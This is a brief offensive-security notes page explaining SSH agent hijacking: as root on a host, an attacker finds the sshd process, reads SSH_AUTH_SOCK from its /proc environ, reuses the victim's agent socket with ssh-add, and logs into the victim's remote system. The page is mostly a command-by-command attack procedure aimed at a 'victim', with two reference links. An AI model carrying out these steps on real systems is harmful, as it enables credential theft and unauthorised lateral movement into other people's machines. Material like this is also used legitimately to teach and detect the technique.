# SSH Hijacking

If we are root on a system, we can compromise an active SSH session to another machine via public key authentication. We can either compromise the SSH agent or gain access to the SSH agent’s unix domain socket and hijack the connection.

ssh-agent creates a unix domain socket, and then listens for connections from the sshd daemon to this socket. Based on the permissions of this socket, any of the authentication keys that are used by the socket can be compromised to any user who can connect to the socket.

To perform this:

First determine the SSH process ID:

```
ps aux | grep sshd
```

Then find the SSH\_AUTH\_SOCK environment variable for the sshd

```
grep SSH_AUTH_SOCK /proc//environ
```

Then hijack the ssh-agent socket:

```
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add –l
```

Finally, we can log into the remote system our victim is logged into:

```
ssh remotesystem -l victim
```

{% embed url="https://jekhokie.github.io/linux/ssh/security/hijacking/2019/09/07/ssh-agent-hijacking.html" %}

{% embed url="https://hx015.medium.com/ssh-session-hijack-analytic-a2c684ba410f" %}
